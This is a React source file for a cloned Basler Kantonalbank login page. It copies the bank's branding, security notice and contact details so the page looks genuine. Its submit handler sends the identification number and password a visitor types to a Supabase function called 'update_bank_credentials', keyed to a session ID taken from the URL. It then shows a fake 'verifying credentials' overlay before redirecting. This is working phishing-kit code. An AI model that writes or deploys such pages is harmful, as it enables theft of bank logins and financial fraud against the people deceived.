import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, AlertTriangle, Info } from "lucide-react";
import bkbLogo from "@/assets/bkb-logo.svg";

const ORANGE = "#F25C26";
const GREEN = "#4D8B2C";
const BTN = "#dde9b9";
const BTN_HOVER = "#cee0a4";

const ChBaslerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [ident, setIdent] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showMore, setShowMore] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Basler Kantonalbank – Login", "/favicon.ico");

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: ident,
        p_password: passwort,
        p_username_label: "Identifikationsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white text-black">
        {/* Header */}
        <header className="bg-black h-20 px-5 md:px-10 flex items-center justify-between">
          <img src={bkbLogo} alt="Basler Kantonalbank" className="h-10 md:h-12 text-white" style={{ color: "#fff" }} />
          <nav className="flex items-center gap-6 text-[15px] text-white">
            <a href="#" className="text-white/60">DE</a>
            <a href="#" className="hover:text-white/80">FR</a>
            <a href="#" className="hover:text-white/80">IT</a>
            <a href="#" className="hover:text-white/80">EN</a>
          </nav>
        </header>

        {/* Main */}
        <main className="flex-1">
          {/* Above the fold */}
          <section className="max-w-[1280px] mx-auto px-5 md:px-10 pt-10 md:pt-14 grid grid-cols-1 lg:grid-cols-2 gap-x-20 gap-y-10">
            {/* Left column */}
            <div>
              <h1 className="text-[40px] md:text-[64px] font-light leading-[1.05] mb-3">Login</h1>
              <p className="text-[18px] mb-10 md:mb-12">Ihr Zugang zum digitalen Banking</p>

              <label htmlFor="bkb-ident" className="font-bold text-[15px] mb-2 block">
                Identifikationsnummer
              </label>
              <input
                id="bkb-ident"
                type="text"
                value={ident}
                onChange={(e) => setIdent(e.target.value)}
                className="w-full h-12 border border-black px-3 outline-none bg-white"
              />

              <label htmlFor="bkb-pass" className="font-bold text-[15px] mb-2 mt-6 block">
                Passwort
              </label>
              <div className="relative">
                <input
                  id="bkb-pass"
                  type={showPassword ? "text" : "password"}
                  value={passwort}
                  onChange={(e) => setPasswort(e.target.value)}
                  className="w-full h-12 border border-black px-3 pr-12 outline-none bg-white"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  aria-label="Passwort anzeigen"
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-black"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>

              <p className="text-[14px] mt-8 mb-8">
                Mit dem Login akzeptieren Sie unsere{" "}
                <a href="#" className="underline">
                  rechtlichen Hinweise und Nutzungsbedingungen
                </a>
                .
              </p>

              <div className="flex items-center gap-6 flex-wrap">
                <button
                  onClick={handleSubmit}
                  className="px-10 py-3 text-[15px] text-black transition-colors"
                  style={{ backgroundColor: BTN }}
                  onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = BTN_HOVER)}
                  onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = BTN)}
                >
                  Login
                </button>
                <a href="#" className="underline text-[15px]">
                  Probleme mit dem Login?
                </a>
              </div>

              <div className="mt-20">
                <h2 className="text-[24px] md:text-[28px] font-light mb-4">
                  Sie nutzen unser Digital Banking noch nicht?
                </h2>
                <a href="#" className="underline text-[15px]">
                  Beantragen Sie Ihren Zugang zum Digital Banking
                </a>
              </div>
            </div>

            {/* Right column — Sicherheitshinweis */}
            <div>
              <div className="p-7 text-white" style={{ backgroundColor: ORANGE }}>
                <div className="flex items-center gap-3 mb-3">
                  <AlertTriangle size={26} strokeWidth={1.5} />
                  <h3 className="text-[22px] md:text-[24px] font-light">Sicherheitshinweis</h3>
                </div>
                <p className="text-[15px] leading-[1.5]">
                  Seien Sie vorsichtig, wenn Sie von Dritten aufgefordert werden, sich
                  einzuloggen oder eine Handlung auszuführen.
                </p>
                <p className="font-bold mt-4 mb-2 text-[15px]">Bitte beachten Sie:</p>
                <ul className="list-disc pl-5 space-y-2 text-[15px] leading-[1.5]">
                  <li>
                    Installieren Sie keine Desktop-Software (z. B. AnyDesk oder TeamViewer)
                    auf Aufforderung Dritter.
                  </li>
                  <li>Bestätigen Sie keine Zahlungen, die Sie nicht selbst veranlasst haben.</li>
                  <li>
                    Bestätigen Sie keine Push-Mitteilungen, wenn Sie von Dritten
                    {showMore ? (
                      <> aufgefordert werden, dies zu tun. Achten Sie generell auf den Absender und Inhalt jeder Nachricht.</>
                    ) : (
                      <>…</>
                    )}
                  </li>
                </ul>
                <button
                  onClick={() => setShowMore(!showMore)}
                  className="border border-white px-5 py-2 mt-5 text-[14px] bg-transparent hover:bg-white/10 transition-colors"
                >
                  {showMore ? "Weniger anzeigen" : "Mehr anzeigen"}
                </button>
              </div>
            </div>
          </section>

          {/* Scroll-Bereich */}
          <section className="max-w-[1280px] mx-auto px-5 md:px-10 mt-24 grid grid-cols-1 lg:grid-cols-2 gap-x-20 gap-y-10">
            {/* Left — Haben Sie Fragen */}
            <div>
              <h2 className="text-[24px] md:text-[28px] font-light mb-4">Haben Sie Fragen?</h2>
              <p className="text-[15px] mb-6 leading-[1.5]">
                Fragen beantwortet Ihnen gerne unsere E-Serviceline von Montag bis Freitag
                von 8:00 Uhr - 18:00 Uhr.
              </p>
              <p className="text-[15px] mb-6">E-Serviceline</p>
              <div className="mb-4">
                <p className="text-[15px]">Inland</p>
                <a href="tel:+41612663636" className="text-[15px]">+41 61 266 36 36</a>
              </div>
              <div>
                <p className="text-[15px]">Ausland</p>
                <a href="tel:+41612663636" className="text-[15px]">+41 61 266 36 36</a>
              </div>
            </div>

            {/* Right — Wichtige Information */}
            <div>
              <div className="p-7 text-white" style={{ backgroundColor: GREEN }}>
                <div className="flex items-center gap-3 mb-3">
                  <Info size={26} strokeWidth={1.5} />
                  <h3 className="text-[22px] md:text-[24px] font-light">Wichtige Information</h3>
                </div>
                <p className="text-[15px] leading-[1.5]">
                  Bitte beachten Sie, dass die Börse in den (USA) aufgrund eines Feiertages
                  heute geschlossen ist.
                </p>
                <p className="text-[15px] mt-4">Vielen Dank für Ihr Verständnis.</p>
              </div>
            </div>
          </section>
        </main>

        {/* Footer */}
        <footer className="border-t border-gray-300 mt-16">
          <div className="max-w-[1280px] mx-auto px-5 md:px-10 py-8 text-[14px]">
            <div className="flex flex-col md:flex-row md:gap-10 gap-3 mb-4">
              <a href="#" className="underline hover:font-bold">Sicherheit</a>
              <a href="#" className="underline hover:font-bold">Bedingungen</a>
              <a href="#" className="underline hover:font-bold">Informationen</a>
              <a href="#" className="underline hover:font-bold">Hilfe und Kontakt</a>
            </div>
            <div className="flex flex-col md:flex-row md:gap-10 gap-3">
              <a href="#" className="underline hover:font-bold">Informationen zu Finanzinstrumenten</a>
              <a href="#" className="underline hover:font-bold">Ausführungsgrundsätze im Wertschriftenhandel</a>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChBaslerKantonalbank;
